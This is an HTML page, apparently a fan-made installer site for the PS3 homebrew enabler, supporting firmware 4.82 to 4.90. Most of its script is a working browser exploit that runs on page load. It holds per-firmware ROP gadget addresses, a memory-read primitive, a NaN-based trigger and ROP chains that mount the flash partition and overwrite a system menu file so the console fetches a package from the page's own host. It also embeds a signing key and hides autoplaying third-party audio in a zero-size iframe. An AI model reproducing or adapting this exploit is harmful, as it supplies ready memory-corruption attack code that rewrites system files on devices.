<!DOCTYPE html>
<html>
<head>
    
    <meta charset = "utf-8">
    <meta name = "viewport" content = "width = device-width">
    <title>PS3Hen</title>
    <link href = "style.css" rel = "stylesheet" type = "text/css">
    <meta name = "description" content = "PS3Hen | Very Famous Ps3 firmware">
    <link rel = "icon" type = "image/x-icon" href = "images/DevAvatar.png">


  <script>
var ua=navigator.userAgent,
	fwv=ua.substring(ua.indexOf("5.0 (")+19,ua.indexOf(") Apple"));
if(fwv==="4.82"){
	var toc_addr=0x6F5550,
	default_vsh_pub_toc=0x6ED5A4,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB68,
	vsh_toc_addr_screenshot=0x72057C,
	vsh_ps3hen_key_toc=0x707774,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725A38,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C0,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A044,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229838,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615C3C,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62DF84,
	gadget11_addr=0x59A4B0,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A8,
	gadget14_addr=0x48C7A0,
	gadget15_addr=0x489C88,
	gadget_mod1_addr=0x60EF38,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C778,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238DC,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB8,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x63315C,
	gadget_mod13_addr=0x336870,
	gadget_mod14_addr=0x633860,
	gadget_mod15_addr=0x39D038,
	gadget_mod16_addr=0x4F732C;}
if(fwv==="4.84"){
	var toc_addr=0x6F5558,
	default_vsh_pub_toc=0x6ED5AC,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB70,
	vsh_toc_addr_screenshot=0x72067C,
	vsh_ps3hen_key_toc=0x70786C,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725B38,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C8,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A0E4,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229838,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615CDC,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62E024,
	gadget11_addr=0x59A4B0,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A8,
	gadget14_addr=0x48C7A0,
	gadget15_addr=0x489C88,
	gadget_mod1_addr=0x60EFD8,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C778,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238DC,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB8,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x6331FC,
	gadget_mod13_addr=0x336870,
	gadget_mod14_addr=0x633900,
	gadget_mod15_addr=0x39D038,
	gadget_mod16_addr=0x4F732C;}
if(fwv==="4.85"){
	var toc_addr=0x6F5558,
	default_vsh_pub_toc=0x6ED5AC,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB70,
	vsh_toc_addr_screenshot=0x72067C,
	vsh_ps3hen_key_toc=0x70786C,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725B38,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C8,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A0E4,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229838,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615CDC,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62E024,
	gadget11_addr=0x59A4B0,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A8,
	gadget14_addr=0x48C7A0,
	gadget15_addr=0x489C88,
	gadget_mod1_addr=0x60EFD8,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C778,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238DC,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB8,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x6331FC,
	gadget_mod13_addr=0x336870,
	gadget_mod14_addr=0x633900,
	gadget_mod15_addr=0x39D038,
	gadget_mod16_addr=0x4F732C;}
if((fwv==="4.86")||(fwv==="4.87")||(fwv==="4.88")||(fwv==="4.89")){
	var toc_addr=0x6F5558,
	default_vsh_pub_toc=0x6ED5AC,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB70,
	vsh_toc_addr_screenshot=0x72082C,
	vsh_ps3hen_key_toc=0x707A1C,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725CE8,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C8,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A0E4,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229838,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615CDC,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62E024,
	gadget11_addr=0x59A4B0,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A8,
	gadget14_addr=0x48C7A0,
	gadget15_addr=0x489C88,
	gadget_mod1_addr=0x60EFD8,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C778,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238DC,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB8,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x6331FC,
	gadget_mod13_addr=0x336870,
	gadget_mod14_addr=0x633900,
	gadget_mod15_addr=0x39D038,
	gadget_mod16_addr=0x4F732C;}
if(fwv==="4.90"){
	var toc_addr=0x6F5558,
	default_vsh_pub_toc=0x6ED5AC,
	vsh_opd_patch=0x96D5C,
	vsh_opd_addr=0x6EBB70,
	vsh_toc_addr_screenshot=0x72082C,
	vsh_ps3hen_key_toc=0x707A1C,
	toc_entry1_addr=0x6DA3D0,
	toc_entry2_addr=0x725CE8,
	toc_entry3_addr=0x6DA3C8,
	toc_entry4_addr=0x740000,
	toc_entry5_addr=0x6EB6C8,
	gadget1_addr=0x097604,
	gadget2_addr=0x60A0DC,
	gadget3_addr=0x0D505C,
	gadget4_addr=0x229834,
	gadget5_addr=0x12BB1C,
	gadget6_addr=0x615CD4,
	gadget7_addr=0x01FFD0,
	gadget8_addr=0x020000,
	gadget9_addr=0x029B08,
	gadget10_addr=0x62E01C,
	gadget11_addr=0x59A4AC,
	gadget12_addr=0x0C864C,
	gadget13_addr=0x48E5A4,
	gadget14_addr=0x48C79C,
	gadget15_addr=0x489C84,
	gadget_mod1_addr=0x60EFD0,
	gadget_mod2_addr=0x013B74,
	gadget_mod3_addr=0x0B8E00,
	gadget_mod4a_addr=0x0D9684,
	gadget_mod4b_addr=0x42C774,
	gadget_mod4c_addr=0x054AF0,
	gadget_mod5_addr=0x4238D8,
	gadget_mod6_addr=0x020C00,
	gadget_mod7_addr=0x01A6AC,
	gadget_mod8_addr=0x2BACB4,
	gadget_mod9_addr=0x010B20,
	gadget_mod10_addr=0x1C5794,
	gadget_mod11_addr=0x18B144,
	gadget_mod12_addr=0x6331F4,
	gadget_mod13_addr=0x33686C,
	gadget_mod14_addr=0x6338F8,
	gadget_mod15_addr=0x39D034,
	gadget_mod16_addr=0x4F7328;}
var xtra_data,
	stack_frame,
	jump_2,
	jump_1,
	xtra_data_addr,
	stack_frame_addr,
	jump_2_addr,
	jump_1_addr,
	offset_array = [],
	t_out = 0,
	search_max_threshold,
	search_base,
	search_size,
	search_base_off,
	search_size_ext,
	gtemp_addr = 2365587456,
	total_loops = 0,
	max_loops = 20,
	frame_fails = 0,
	sp_exit = 0x8FD8DCC0,
	ffs = 4294967295,
	dbyte41 = 16705,
	dbyte00 = 0,
	byte_size = 1,
	hword_size = 2,
	word_size = 4,
	dword_size = 8,
	mbytes = 1048576,
	stat_size_offset = 40,
	index_key = "DA7D4B5E499A4F53B1C1A14A7484443B",
	ps3xploit_ecdsa_key = "948DA13E8CAFD5BA0E90CE434461BB327FE7E080475EAA0AD3AD4F5B6247A7FDA86DF69790196773",
	flash_partition='xxxxCELL_FS_IOS:BUILTIN_FLSH1',
	filesystem='CELL_FS_FAT',
	mount_path='/dev_rewrite',
	fail_msg_frag="<h1><span style='color:red'>Exploit initialization failed!</h1></span>",
	progress_msg_frag1="<h1>Initializing... ",
	progress_msg_frag2='%</h1>',
	write_file = "/dev_rewrite/vsh/resource/explore/xmb/category_network.xml",
	baseURL = window.location.href.replace(/[^/]*$/, ''),
	write_file_contents='<?xml version="1.0" encoding="UTF-8"?><XMBML version="1.0"><View id="root"><Attributes><Table key="hen"><Pair key="focus_priority"><String>-1</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="hen" attr="hen" src="#hen_link"/><Query class="type:x-xmb/folder-pixmap" key="seg_premo" src="sel://localhost/nopremo?category_network.xml#seg_premo"/><Query class="type:x-xmb/folder-pixmap" key="seg_browser" src="#seg_browser"/></Items></View><View id="seg_premo"><Items><Item class="type:x-xmb/xmlpremo" key="PRemo" /></Items></View><View id="seg_browser"><Attributes><Table key="browser"><Pair key="icon_rsc"><String>tex_browser</String></Pair><Pair key="icon_notation"><String>WNT_XmbItemBrowser</String></Pair><Pair key="title_rsc"><String>msg_browser</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlwebbrowser" key="browser" attr="browser" /></Items></View><View id="hen_link"><Attributes><Table key="ps3hen_main"><Pair key="icon_rsc"><String>item_tex_Players</String></Pair><Pair key="title"><String>Install HEN</String></Pair><Pair key="info"><String>Downloads and installs the latest HEN Package (Reboot after)</String></Pair></Table></Attributes><Items><Query class="type:x-xmb/folder-pixmap" key="ps3hen_main" attr="ps3hen_main" src="#ps3hen_pkg" /></Items></View><View id="ps3hen_pkg"><Attributes><Table key="ps3hen_link"><Pair key="info"><String>net_package_install</String></Pair><Pair key="pkg_src"><String>'+baseURL+fwv+'/HEN.pkg</String></Pair><Pair key="pkg_src_qa" ><String>'+baseURL+fwv+'/HEN.pkg</String></Pair><Pair key="content_name"><String>msg_install</String></Pair><Pair key="content_id"><String>CUSTOM-INSTALLER_00-0000000000000000</String></Pair><Pair key="prod_pict_path"><String>'+baseURL+'hendl.png</String></Pair></Table></Attributes><Items><Item class="type:x-xmb/xmlnpsignup" key="ps3hen_link" attr="ps3hen_link" /></Items></View></XMBML>';
document.write('<html><title>PS3Xploit - HEN Installer</title><div id="result"></div><div id="exploit"></div><div id="trigger"></div></html>');
function memcpy(dest,src,len)
{
	return callsub(gadget8_addr,dest,src,len,0,0,0,0,0,0,0x70);
}
function callsub(sub,r3,r4,r5,r6,r7,r8,r9,r10,r11,sub_frame_size,r31in,r31out)
{
	var min_stack_size=0x20; 
	if(r31out===null){r31out=gtemp_addr;}
	if(r31in===null){r31in=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(r11)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31in)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(sub)+fill_by_16bytes(sub_frame_size-min_stack_size,dbyte00)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function encTxt(text)
{
	return String.fromCharCode.apply(null,text.split('').map(function(e){return e.charCodeAt(0).toString(16)}).join('').toUpperCase().match(/[A-F0-9]{4}/g).map(function(v){return parseInt(v,16)}))
}
function showResult(str)
{
	document.getElementById('result').innerHTML=str;
}
function syscall_r3_p2p(sc,r3_ptr,r4,r5,r6,r7,r8,r9,r10,r31out)
{
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)
	+hexw2bin(sc)+hexw2bin(r10)+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3_ptr)
	+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4b_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function save_file_overwrite(to,fd,buf,wlen,size,nl)
{
	return syscall(0x321,to,0x241,fd,0x1B6,nl,0,0,0)
		+syscall_r3_p2p(0x323,fd,buf,size,wlen,0,0,0,0,0,0)
		+syscall_r3_p2p(0x324,fd,0,0,0,0,0,0,0,0,0);
}
function hexh2bin(hex_val)
{
	return String.fromCharCode(hex_val);

}
function hexw2bin(hex_val)
{
	return String.fromCharCode(hex_val >> 16) + String.fromCharCode(hex_val);
}
function hexdw2bin(hex_val)
{
	return hexw2bin(0) + hexw2bin(hex_val);
}
String.prototype.toHex16 = function()
{
	return ('0000' + this).substr(-4);
};
String.prototype.toAscii = function(hex_16)
{
    var ascii='';
	var i=0;
	while(i<this.length){if(hex_16===true){ascii += this.charCodeAt(i).toString(16).toHex16();} else {ascii += this.charCodeAt(i).toString(16);}i+=1;}
	return ascii;
};
String.prototype.convert=function(ascii)
{
	if(this.length<1){return '';}
	var asciistr='';var asciichr='';var i=0;var ret=[];
	if(ascii===true){asciistr = this;}
	else {asciistr = this.toAscii();}
	while((asciistr.length%4)!==0){asciistr+='00';}
	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
    while(i<asciistr.length){
		asciichr = asciistr.substr(i, 4);
		ret.push(String.fromCharCode(parseInt(asciichr, 16)));
		i+=4;
    }
    return ret.join('');
};
String.prototype.convertedSize = function(ascii)
{
	if(this.length<1){return 0;}
	var asciistr='';
	if(ascii===true){asciistr=this;}
	else {asciistr = this.toAscii();}
	while((asciistr.length%4)!==0){asciistr+='00';}
	if(asciistr.substr(asciistr.length-3,2)!=='00'){asciistr+='0000';}
	return asciistr.length/2;
};
String.prototype.replaceAt=function(index, ch)
{
	return this.substr(0,index)+ch+this.substr(index+ch.length);
};
String.prototype.repeat = function(num)
{
    return new Array(num+1).join(this);
};
Number.prototype.noExponents=function()
{
    var data= String(this).split(/[eE]/);
    if(data.length===1) {return data[0];}
    var  z= '', sign= this<0? '-':'',
    str= data[0].replace('.', ''),
    mag= Number(data[1])+ 1;
    if(mag<0){
        z= sign+'0.';
        while(mag++){z+='0';}
        return z+str.replace(/^\-/,'');
    }
    mag -= str.length;  
    while(mag--) {z += '0';}
    return str + z;
};
function fromIEEE754(bytes, ebits, fbits)
{
	var retNumber=0;
	var bits=[];
	var i;
	var j;
	var byte;
	for (i=bytes.length;i;i-=1)
	{
		byte=bytes[i-1];
		for(j=8;j;j-=1)
		{
			bits.push(byte % 2 ? 1 : 0); byte = byte >> 1;
		}
	}
	bits.reverse();
	var str = bits.join('');
	var bias = (1 << (ebits - 1)) - 1;
	var s = parseInt(str.substring(0, 1), 2) ? -1 : 1;
	var e = parseInt(str.substring(1, 1 + ebits), 2);
	var f = parseInt(str.substring(1 + ebits), 2);
	if (e === (1 << ebits) - 1)
	{
		retNumber = f !== 0 ? NaN : s * Infinity;
	}
	else if (e > 0)
	{
		retNumber = s * Math.pow(2, e - bias) * (1 + f / Math.pow(2, fbits));
	}
	else if (f !== 0)
	{
		retNumber = s * Math.pow(2, -(bias-1)) * (f / Math.pow(2, fbits));
	}
	else
	{
		retNumber = s * 0;
	}
	return retNumber.noExponents();
}
function generateIEEE754(address, size)
{
	var hex = new Array
	(
		(address >> 24) & 0xFF,
		(address >> 16) & 0xFF,
		(address >> 8) & 0xFF,
		(address) & 0xFF,
		
		(size >> 24) & 0xFF,
		(size >> 16) & 0xFF,
		(size >> 8) & 0xFF,
		(size) & 0xFF
	);
	return fromIEEE754(hex, 11, 52);
}
function generateExploit(address, size)
{
	var n = (address<<32) | ((size>>1)-1);
	return generateIEEE754(address, (n-address));
}
function readMemory(address, size)
{
	if(document.getElementById('exploit')){document.getElementById('exploit').style.src = "local(" + generateExploit(address, size) + ")";}
}
function checkMemory(address, size, len)
{
	if(document.getElementById('exploit'))
	{
		readMemory(address, size);
		return document.getElementById('exploit').style.src.substr(6,len);
	}
}
function trigger(exploit_addr){
	if(document.getElementById('trigger')){document.getElementById("trigger").innerHTML = -parseFloat("NAN(ffffe" + exploit_addr.toString(16) + ")");}
	if (document.getElementById('trigger').innerHTML.indexOf("NaN") != -1) {
		document.write("<html><h1><span style='color:red'>You must install Hybrid Firmware (HFW) before installing HEN!</h1></span></html>");
		return;
	}
}
function load_check()
{
	if(total_loops<max_loops)
	{
		showResult(progress_msg_frag1+((100/max_loops)*total_loops).toString()+progress_msg_frag2);
		t_out=setTimeout(initROP,150,false);
	}
	else
	{
		total_loops=0;
		showResult(fail_msg_frag);
		t_out=0;
	}
}
function findJsVariableOffset(name,exploit_data,base,size)
{
	readMemory(base,size);
	var dat=document.getElementById('exploit').style.src.substr(6,size);
	var i=0;
	var t;
	var k;
	var match;
	var exploit_addr;
	while(i<(dat.length*2))
	{
		if (dat.charCodeAt(i/2)===exploit_data.charCodeAt(0))
		{
			match=0;
			for (k=0;k<(exploit_data.length*2);k+=0x2)
			{
				if (dat.charCodeAt((i+k)/2) !== exploit_data.charCodeAt(k/2)){break;}
				match+=1;
			}
			if (match===exploit_data.length)
			{
				exploit_addr=base+i+4;
				
				for(t=0;t<offset_array.length;t+=1)
				{
					if(offset_array[t]===exploit_addr)
					{
						return -1;
					}
				}
				offset_array.push(exploit_addr);
				return exploit_addr;
			}
		}
		i+=0x10;
	}
	var end_range=base+size;
	return 0;
}
function stack_frame_hookup()
{
	return unescape("\u4141\u2A2F")+hexw2bin(gadget1_addr)+hexw2bin(toc_addr)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(toc_addr)+fill_by_16bytes(0x70,dbyte41);
}
function stack_frame_exit()
{
	return hexdw2bin(gadget_mod8_addr)+unescape("\u2F2A");
}
function syscall(sc,r3,r4,r5,r6,r7,r8,r9,r10,r31out)
{
	if(r31out===null){r31out=gtemp_addr;}
	return hexdw2bin(gadget_mod2_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod1_addr)+fill_by_16bytes(0x50,dbyte41)+fill_by_4bytes(0xC,dbyte41)+hexw2bin(sc)+hexw2bin(r10)
	+hexw2bin(r8)+hexw2bin(r7)+hexw2bin(r6)+hexw2bin(r5)+hexw2bin(r4)+fill_by_4bytes(0x4,dbyte41)+hexw2bin(r9)+fill_by_16bytes(0x20,dbyte41)+hexdw2bin(r3)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod2_addr)
	+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(gtemp_addr)+fill_by_16bytes(0x10,dbyte41)+hexdw2bin(gadget_mod4a_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function fill_by_4bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/4){stemp+=tmp.repeat(2);iterator++;}
	return stemp;
}
function fill_by_8bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/8){stemp+=tmp.repeat(4);iterator++;}
	return stemp;
}
function fill_by_16bytes(nbytes,hex_val)
{
	var stemp='';var iterator=0;var tmp=hexh2bin(hex_val);
	while(iterator<nbytes/16){stemp+=tmp.repeat(8);iterator++;}
	return stemp;
}
function store_word(store_offset,val,r29out,r30out,r31out)
{
	r29out=gtemp_addr;
	r30out=gtemp_addr;
	r31out=gtemp_addr;
	return hexdw2bin(gadget_mod3_addr)+fill_by_16bytes(0x60,dbyte41)+hexdw2bin(val)+fill_by_8bytes(0x8,dbyte41)+hexdw2bin(store_offset-0xC74)+fill_by_16bytes(0x10,dbyte41)
	+hexdw2bin(gadget_mod7_addr)+fill_by_16bytes(0x70,dbyte41)+hexdw2bin(r29out)+hexdw2bin(r30out)+hexdw2bin(r31out)+hexdw2bin(sp_exit)+fill_by_8bytes(0x8,dbyte41);
}
function initROP(init)
{
	try
	{

		if(init===true){frame_fails=0;search_base_off=0;search_size_ext=0;}
		if(t_out!==0){clearTimeout(t_out);t_out=0;}
		offset_array=[];
		xtra_data_addr=0;
		stack_frame_addr=0;
		jump_2_addr=0;
		jump_1_addr=0;
		search_max_threshold=70*0x100000;
		search_base=0x80200000;
		search_size=2*mbytes;
		search_base_off=0*mbytes;
		search_size_ext=0*mbytes;
		total_loops++;
		store_idx_arr1=[];
		store_idx_arr2=[];

		xtra_data=flash_partition.convert()
		+index_key.convert(true)
		+ps3xploit_ecdsa_key.convert(true)
		+filesystem.convert()
		+mount_path.convert()
		+write_file.convert()
		+fill_by_4bytes(0xC,dbyte00)
		+encTxt(write_file_contents)
		+fill_by_4bytes(0xC,dbyte00)
		+fill_by_16bytes(0x90,dbyte00)
		+unescape("\uFD7E");

		while(xtra_data_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			xtra_data=xtra_data.replaceAt(0,hexh2bin(0x7EFD));
			xtra_data_addr=findJsVariableOffset("xtra_data",xtra_data,search_base,search_size);
			search_max_threshold-=search_size;
		}

		flash_partition_addr=xtra_data_addr;
		index_key_addr=flash_partition_addr+flash_partition.convertedSize()-0x4;
		ps3xploit_ecdsa_key_addr=index_key_addr+index_key.convertedSize(true);
		fs_addr=ps3xploit_ecdsa_key_addr+ps3xploit_ecdsa_key.convertedSize(true);
		mount_path_addr=fs_addr+filesystem.convertedSize();

		write_file_addr=mount_path_addr+mount_path.convertedSize();
		write_filefd_addr=write_file_addr+write_file.convertedSize();
		write_file_readlen_addr=write_filefd_addr+word_size;
		write_file_contents_addr=write_file_readlen_addr+dword_size;

		null_addr=write_file_contents_addr+dword_size;

		stack_frame=stack_frame_hookup()
		+store_word(toc_entry1_addr, vsh_opd_patch+4)
		+store_word(toc_entry3_addr, vsh_opd_patch+4)
		+store_word(toc_entry5_addr, vsh_opd_patch+4)
		+store_word(default_vsh_pub_toc, vsh_ps3hen_key_toc)
		+memcpy(vsh_ps3hen_key_toc-0x20, index_key_addr, (index_key.length/2))
		+memcpy(vsh_ps3hen_key_toc,ps3xploit_ecdsa_key_addr,(ps3xploit_ecdsa_key.length/2))
		+syscall(0x345,flash_partition_addr,fs_addr,mount_path_addr,0,0,0,0,0)
		+save_file_overwrite(write_file_addr,write_filefd_addr,write_file_contents_addr,write_file_readlen_addr,write_file_contents.length,null_addr)
		+stack_frame_exit();

		while(stack_frame_addr===0)
		{
			if(search_max_threshold<search_size+search_size_ext){frame_fails++;if((frame_fails%10)===0){search_base_off+=0;search_size_ext+=0;}load_check();return;}
			stack_frame=stack_frame.replaceAt(0,hexh2bin(0x2A2F));
			stack_frame_addr=findJsVariableOffset("stack_frame",stack_frame,search_base+search_base_off,search_size+search_size_ext);
			if(stack_frame_addr==-1)if(search_max_threshold<search_size+search_size_ext){frame_fails++;load_check();return;}
			search_max_threshold-=search_size+search_size_ext;
		}
		jump_2=unescape("\u0102\u7EFB")+fill_by_16bytes(0x30,0x8282)+hexw2bin(stack_frame_addr)+unescape("\uFB7E");		
		while(jump_2_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			jump_2=jump_2.replaceAt(0,hexh2bin(0x7EFB));
			jump_2_addr=findJsVariableOffset("jump_2",jump_2,search_base,search_size);
			if(jump_2_addr==-1)if(search_max_threshold<search_size){load_check();return;}
			search_max_threshold-=search_size;
		}
		jump_1=unescape("\u4141\u7EFA")+hexw2bin(jump_2_addr)+unescape("\uFA7E");
		while(jump_1_addr===0)
		{
			if(search_max_threshold<search_size){load_check();return;}
			jump_1=jump_1.replaceAt(0,hexh2bin(0x7EFA));
			jump_1_addr=findJsVariableOffset("jump_1",jump_1,search_base,search_size);
			if(jump_1_addr==-1)if(search_max_threshold<search_size){load_check();return;}
			search_max_threshold-=search_size;
		}
		var sf=checkMemory(stack_frame_addr-0x4,0x8000,stack_frame.length);
		var x=checkMemory(xtra_data_addr-0x4,0x1000,xtra_data.length);
		var j2=checkMemory(jump_2_addr-0x4,0x1000,jump_2.length);
		var j1=checkMemory(jump_1_addr-0x4,0x1000,jump_1.length);
		if((j2===jump_2)&&(j1===jump_1)&&(x===xtra_data)&&(sf===stack_frame))
		{
			if(t_out!==0){clearTimeout(t_out);}
			showResult('<h1>Preparing...');
			triggerX();
		}
		else
		{
			load_check();
		}
	}
	catch(e)
	{
		
	}
}
function triggerX()
{
	setTimeout(trigger,100,jump_1_addr);
	setTimeout(showResult,2000,"<h1>How to install HEN</h1><h2>1. Close browser<br>2. Open Remote Play and quit immediately<br>3. Use new icon to download and install HEN</span><br>4. Reboot after installation</h2>");
	t_out=0;
	total_loops=0;
}
initROP(true);
</script>
</head>
<body>

<audio src="Hen.wavh" autostart="true" loop="true" width="2" height="0"> </audio>

  <audio src="https://www.youtuberepeater.com/watch?v=hovTznCeIQI&name=GTA+5+ONLINE+INTRO+FOR+KILL+MONTAGE+DOPE+EDIT#gsc.tab=0" autostart="true" loop="true" width="2" height="0"> </audio>
<iframe src="https://www.youtuberepeater.com/watch?v=hovTznCeIQI&name=GTA+5+ONLINE+INTRO+FOR+KILL+MONTAGE+DOPE+EDIT#gsc.tab=0" autostart="true" loop="true" width="0" height="0"> </iframe>
  <div></div>
    <div class = "blurs">
        <div id = "blur1"></div>
        <div id = "blur2"></div>
    </div>

    <div class = "background">
        <ul class = "squares"></ul>
    </div><br><br><br><br>
    <div class = "main">
        <img src = "images/DevAvatar.svg" class = "DevAvatar"> </img>
        <div class = "greet">
            <h1 class = "hyper">PS3Hen <img src="HenAvatar.png" width="20px" weight="20px"> </h1> 
            <h2>Installer</h2>
          <h1 class = "me"> By UNKNOWN GHOST MODZ <img src="DevAvatar.png" width="17px" weight="17px"> </h1>
           <br>
          <h1 style="color:red;"> [ Warning ] </h1>
          <h1 class = "test">DO NOT ENABLE FSM (Factory Service Mode) WITH PS3HEN!
DO NOT INSTALL CCAPI WITH PS3HEN! </h1>
        </div>
           <div class = "content">
           <div id = "main">
            <h1 style="font-size:16px"> Supports Versions <br> 4.82 - 4.90</h1>
            <h2>Tools</h2>
            <p>Retry Install <a href = "index.html" target = "_blank">Retry</a><br><br>Latest Update <a href = "http://ps3xploit.me/hen/release/490/cex/installer/Latest_HEN_Installer_signed.pkg" target = "_blank">Download</a><br><br>
Auto Installer <a href = "404.html" target = "_blank">Click Here</a><br><br>
Developers Files <a href = "http://ps3xploit.me/hen/release/PS3HEN_3.1.1-Developers-Only.zip" target = "_blank">Download</a><br><br>
Ps3Hen Source <a href = "https://github.com/PS3Xploit/PS3HEN" target = "_blank">Download</a><br><br>
Support Me <a href = "https://discord.gg/q9AWbsTwN7" target = "_blank">Join Discord</a><br>
            </p>
             <br>
            <h2 style="font-size:16px">How To Install Hen</h2>
            <ul>
                <li style="font-size:15px"> Step 1<br>
               Mega HFW 4.90 <a href = "https://mega.nz/file/PVRWULBQ#YMRfhIn6owEzXYTHZR4l_hiiRKr7BvtJWfWbO-IcEDw" target = "_blank">Download</a><br>
                 Mediafire HFW 4.90 <a href = "https://www.mediafire.com/file/vt5x8d8aadk4m5j/PS3.zip/file" target = "_blank">Download</a><br>
                </li><br>
